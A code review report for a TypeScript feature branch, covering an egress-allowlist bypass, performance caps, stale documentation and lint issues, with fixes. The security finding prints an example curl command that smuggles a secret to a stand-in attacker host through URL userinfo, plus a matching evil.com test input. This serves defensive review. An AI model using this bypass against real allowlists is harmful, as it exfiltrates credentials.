# Code Review — `feature/explore` vs `master`

_Date: 2026-05-27_

## Overview

Large architectural migration: the separate `packages/commit` and `packages/qa` plugins were absorbed into a unified `src/modules/*` harness, with new modules added — `agent-registry`, `coordinator` (parallel agent dispatch + wave scheduling + polling), `pantheon-config`, `qa` (sandboxed recipe execution + secret handling), and a `session-notification` hook. 152 source files changed (+108 generated `dist/` files).

**Verification gate — all green:**
- `tsc --noEmit`: clean (0 errors)
- `vitest run`: **527 tests passed (47 files)**
- `verify-dist-sync`: `dist/` in sync with `src/`
- `npm audit`: 0 vulnerabilities

**Overall health: GOOD.** Unusually defense-conscious code — env allowlisting, secret wrapping/scrubbing, control-byte neutralization, byte-safe truncation, anti-recursion guards, and DoS caps are all present and well-reasoned. One real security bypass was found; everything else is polish.

## Severity Summary (post-verification)

| Severity | Count |
|----------|-------|
| CRITICAL | 0 |
| HIGH     | 1 |
| MEDIUM   | 6 |
| LOW      | 4 |

---

## Findings

### [HIGH] SEC-001: Egress allowlist bypass via URL userinfo `[verified]`
**Status:** ✅ Fixed (2026-05-27)


**ID:** SEC-001
**Location:** `src/modules/qa/binding-parser.ts:196` (`hostOfURL`), consumed at lines 343/351/371 in `validateRecipe`
**Category:** Security
**CWE:** CWE-918 (SSRF) / CWE-20 (Improper Input Validation) → CWE-200 (data exfiltration)
**OWASP:** A05:2025, A01:2025
**Effort:** easy

**Problem:**
`hostOfURL` extracts the host with a regex whose host class `[\w.-]+` excludes `@`, so it captures the *userinfo* segment as the host:

```ts
const m = urlOrTemplate.match(/^(?:[a-zA-Z][a-zA-Z0-9+.-]*:\/\/)?(\$\{?[A-Z_][A-Z0-9_]*\}?|[\w.-]+)/)
```

`validateRecipe` confines `curl`/`psql`/`sqlite3` to the binding's declared `Egress:` host via a bare string equality on `hostOfURL` output. No `FORBIDDEN_TOKENS` or `CURL_FORBIDDEN_FLAGS` entry rejects an `@` in a bare URL. Both the recipe and the `Egress:` declaration are parsed from the **same QA-plan markdown** (`parseBindings(args.plan)`), which is attacker-influenceable in the Pantheon trust model.

**Impact:**
An attacker who influences the plan declares `Egress: https://egress.example.com` and writes:
```
curl https://egress.example.com@attacker.com/?d=$QA_BIND_SECRET
```
`hostOfURL` returns `egress.example.com` for both sides → equality passes → `curl` actually connects to `attacker.com`. Bound `secret`-typed inputs are composed into the recipe child env (`execute-recipe.ts:53-80`), so the secret is exfiltrated. The bash reference implementation `scripts/qa-preflight.sh:77,112` already strips userinfo via `${rest##*@}` — the TypeScript validator is an unguarded divergence. Both the Challenger and Cross-Verifier independently confirmed exploitability.

**Remediation:** Parse the host with the platform `URL` API and reject embedded userinfo (mirrors the bash side):
```ts
function hostOfURL(urlOrTemplate: string): string | null {
  const varMatch = urlOrTemplate.match(/^(?:[a-zA-Z][a-zA-Z0-9+.-]*:\/\/)?(\$\{?[A-Z_][A-Z0-9_]*\}?)/)
  if (varMatch) return varMatch[1] ?? null
  try {
    const u = new URL(urlOrTemplate.includes("://") ? urlOrTemplate : `scheme://${urlOrTemplate}`)
    if (u.username !== "" || u.password !== "") return null // reject userinfo
    return u.hostname || null
  } catch {
    return null
  }
}
```
Add a regression test: `validateRecipe('curl https://api.host.com@evil.com/x', 'https://api.host.com')` must return `status: "error"`.

---

### [MEDIUM] ARCH-001: `binding-parser.ts` fuses security validator with markdown parser
**Status:** ✅ Fixed (2026-05-27)


**ID:** ARCH-001
**Location:** `src/modules/qa/binding-parser.ts:1-539`
**Category:** Architecture
**Effort:** medium

**Problem:** The only file over 500 LOC fuses two distinct concerns: the **security-critical recipe validator** (`validateRecipe` + allowlists + egress checks, lines 21-382) and the **markdown plan parser** (`parseBindings`, lines 384-539). SRP violation — the most safety-critical code in the module (where SEC-001 lives) is buried with text munging.

**Remediation:** Extract the validator into `src/modules/qa/recipe-validator.ts`; keep `binding-parser.ts` for markdown extraction importing the validator. (Below the God-object bar — single cohesive theme, pure functions, no shared mutable state.)

---

### [MEDIUM] PERF-001: Unbounded stdout/stderr accumulation in recipe child
**Status:** ✅ Fixed (2026-05-27)


**ID:** PERF-001
**Location:** `src/modules/qa/run-bash.ts:74-81`
**Category:** Performance
**CWE:** CWE-400
**Effort:** easy

**Problem:** Child output is accumulated via unbounded string concatenation (`stdout += d.toString()`), bounded only by the 30s wall-clock timeout. A recipe emitting high-volume output (e.g. `yes`, `base64 /dev/urandom`) grows memory until the timeout fires. The `too long > 4096` check in `execute-recipe.ts` only runs *after* full accumulation. Shares the untrusted-child boundary with SEC-001.

**Remediation:** Add a byte ceiling on accumulated stdout/stderr and kill the child early once exceeded (e.g. cap at a few hundred KiB), rather than relying solely on the time limit.

---

### [MEDIUM] PERF-002: Uncached synchronous asset reads
**Status:** ✅ Fixed (2026-05-27)


**ID:** PERF-002
**Location:** `src/modules/_shared/load-asset.ts:24-28`
**Category:** Performance
**Effort:** trivial

**Problem:** `loadModuleAsset` calls `readFileSync` on every invocation with no caching, used to load prompt sections / command bodies / agent markdown. Minor — these are command/init-time, not hot-loop, calls.

**Remediation:** Optional. Memoize by resolved path if these are ever called repeatedly per session. Acceptable to leave as-is.

---

### [MEDIUM] MAINT-002: Unused import fails `npm run lint`
**Status:** ✅ Fixed (2026-05-27)


**ID:** MAINT-002
**Location:** `tests/modules/agent-registry/metadata-coverage.test.ts:9`
**Category:** Maintainability
**Effort:** trivial

**Problem:** `registerAgentMetadata` is imported but never used; `@typescript-eslint/no-unused-vars` is configured as `error`, so `eslint .` fails. This is the only in-scope lint error (4 others live in unrelated `packages/*` and a `.worktrees/` checkout).

**Remediation:** Remove the symbol from the import block.

---

### [MEDIUM] MAINT-003: Security-relevant `truncate-bytes.ts` has no dedicated test
**Status:** ⚠️ Partially Fixed (2026-05-27)


**ID:** MAINT-003
**Location:** `src/modules/coordinator/truncate-bytes.ts:1-21`
**Category:** Maintainability
**Effort:** easy

**Problem:** `truncateBytes` performs UTF-8-byte-safe truncation of **untrusted specialist output** (called from `dispatch.ts:379`, `poller.ts`), handling partial multi-byte sequences at the cut. Exercised only transitively — no focused test pins the boundary behavior.

**Remediation:** Add `truncate-bytes.test.ts`: ASCII under/over cap, exact-cap boundary, a 4-byte emoji straddling the cap (assert partial byte dropped, not `�`), and marker append.

---

### [MEDIUM] DOC-001: Security-model table cites non-existent `recipe-parser.ts` `[verified]`
**Status:** ✅ Fixed (2026-05-27)


**ID:** DOC-001
**Location:** `docs/plugins/coordinator.md:221`
**Category:** Documentation
**Effort:** trivial
**Severity note:** Documentation auditor proposed HIGH; Challenger downgraded to MEDIUM (single stale path, behavior described accurately, and `qa.md:205` points to the correct file). Cross-Verifier notes the stale path points *away* from the file containing SEC-001 — so fix it alongside SEC-001.

**Problem:** The "Security model" table's "Where" cell for `execute_recipe` AST validation cites `src/modules/qa/recipe-parser.ts`, which does not exist. The real enforcement is `validateRecipe()` in `binding-parser.ts`.

**Remediation:** Change the cell to `src/modules/qa/binding-parser.ts + src/modules/qa/child-env.ts` (or to `recipe-validator.ts` if ARCH-001's extraction is done — which makes the documented name accurate).

---

### [MEDIUM] DOC-002: `qa.md` project-structure table misdescribes 6 modules
**Status:** ✅ Fixed (2026-05-27)


**ID:** DOC-002
**Location:** `docs/plugins/qa.md:374-397`
**Category:** Documentation
**Effort:** easy

**Problem:** The file-by-file table contradicts the code (while the prose above is correct):
- `record-input.ts` — says "captures the `/run-qa` invocation"; actually records user-pasted `NAME=value` inputs into `BindingsStore`.
- `execute-recipe.ts` — says "returns redacted env vars"; actually returns **only enum status payloads, never the minted value** (directly contradicts the no-value-to-LLM guarantee — and this is the exact secret-flow path SEC-001 exploits).
- `shell-env-hook.ts` — says "scrubs inherited env"; actually injects resolved bindings into the child env.
- `bindings-store.ts` — says "keyed by run-id"; actually keyed by parent session ID.
- `dispatch-extensions.ts` — says "wraps dispatch_parallel with timeout/merging"; actually a write-once cross-module registry.
- `session-agent-registry.ts` — says "maps zmora → variant"; actually maps `childSessionID → agent name`.

**Remediation:** Rewrite the six rows to match the code. Prioritize the `execute-recipe.ts` row — the wrong wording undermines a core security guarantee.

---

### [LOW] MAINT-001: Forbidden project-internal review IDs in source comments `[verified]`
**Status:** ✅ Fixed (2026-05-27)


**ID:** MAINT-001
**Location:** 12 files incl. `src/modules/qa/binding-parser.ts`, `index.ts`, `coordinator/dispatch.ts`, `pantheon-config/schema.ts`, `qa/execute-recipe.ts`, `run-bash.ts`, `child-env.ts`, etc.
**Category:** Maintainability
**Effort:** easy
**Severity note:** Code-quality auditor proposed HIGH; Challenger downgraded to LOW (pure comment-hygiene/doctrine, zero runtime/security/correctness impact).

**Problem:** `AGENTS.md:236` ("Code Review Artefacts") forbids writing review IDs (`SEC-`, `ARCH-`, `MAINT-`, `PERF-`, `COMP-`) into source/test files; `CWE-*` / `CVE-*` / `OWASP` are explicitly exempt (line 244). The new modules embed internal IDs in comments (e.g. `COMP-002` at `binding-parser.ts:21`). The surrounding prose rationale is excellent and load-bearing — only the bare IDs are the issue.

**Remediation:** Strip the internal IDs, keep the prose and `CWE-*`; rebuild `dist/`.

---

### [LOW] MAINT-004: Justified double-cast at hook boundary
**Status:** ✅ Fixed (2026-05-27)


**ID:** MAINT-004
**Location:** `src/hooks/session-notification/plugin.ts:21`
**Category:** Maintainability
**Effort:** medium

**Problem:** A single `as unknown as NotificationSenderContext` double-cast — thoroughly justified in an 11-line comment (Bun's recursive-`this` `BunShell` is structurally incompatible with the `ShellChain` alias). Flagged for completeness only.

**Remediation:** Optional — define `NotificationSenderContext.$` with a recursive `this`-returning type. Acceptable as-is given the comment.

---

### [LOW] MAINT-005: Trivial `_shared` registry untested
**Status:** ✅ Fixed (2026-05-27)


**ID:** MAINT-005
**Location:** `src/modules/_shared/session-agent-registry.ts:13-24`
**Category:** Maintainability
**Effort:** trivial

**Problem:** `SessionAgentRegistry` (a thin `Map` wrapper, 3 one-line methods) has no dedicated test; covered indirectly via `shell-env-hook.test.ts` and dispatch tests. Low priority given triviality.

**Remediation:** Optionally add `session-agent-registry.test.ts`.

---

## Cross-Analysis (Security ↔ Quality ↔ Documentation)

The Cross-Verifier produced two composite findings worth acting on as units:

- **[COMPOSITE-1] [HIGH] The egress bypass sits in a poorly-isolated, untested, mis-documented boundary.** SEC-001 (exploitable bypass) + ARCH-001 (validator buried in a 539-LOC mixed-concern file) + MAINT-003-class gap (no negative test for `hostOfURL`) + DOC-001 (security model points at a non-existent file). Each weakness made the others harder to catch — which is *why* the bash/TS divergence stayed latent. **Fix as one change set:** patch `hostOfURL`, extract `recipe-validator.ts`, add a parity test suite using `qa-preflight.sh` as the oracle, and correct `coordinator.md:221`.

- **[COMPOSITE-2] [MEDIUM] Contradictory secret-handling docs around the SEC-001 sink.** DOC-002's `execute-recipe.ts` "returns redacted env vars" contradicts the authoritative "enum status only, never the minted value" invariant — risky precisely because it describes the data path SEC-001 exfiltrates. Reconcile `qa.md` to the invariant and verify in code before republishing.

**Coverage gap worth noting:** No test or CI mechanism keeps `scripts/qa-preflight.sh` (bash egress check) and `binding-parser.ts` (TS egress check) in parity — that absence is what allowed SEC-001's divergence. A shared parity test is recommended.

---

## Verification Summary

**Method:** Cross-domain correlation (Cross-Verifier) + adversarial review (Challenger), both run against the actual code.

| Metric | Count |
|--------|-------|
| Findings verified | 11 |
| False positives removed | 0 |
| Severity adjustments | 2 (MAINT-001 HIGH→LOW; DOC-001 HIGH→MEDIUM) |
| Cross-analysis composites added | 2 |

### Challenged Findings
- **SEC-001** — confirmed HIGH; exploitability verified end-to-end. Not CRITICAL because exploitation requires influencing the QA plan.
- **MAINT-001** — downgraded HIGH→LOW: real doctrine violation but zero runtime/security/correctness impact (comment hygiene).
- **DOC-001** — downgraded HIGH→MEDIUM: factually correct but an isolated stale path; behavior documented accurately and `qa.md:205` points to the right file.

### Cross-Analysis (escalation note)
The Cross-Verifier argued for escalating DOC-001/DOC-002 on security-relevance grounds; the Challenger's calibrated single-finding severities (MEDIUM) were kept, with the compounded risk captured in COMPOSITE-1/COMPOSITE-2 so the relationship to SEC-001 isn't lost.
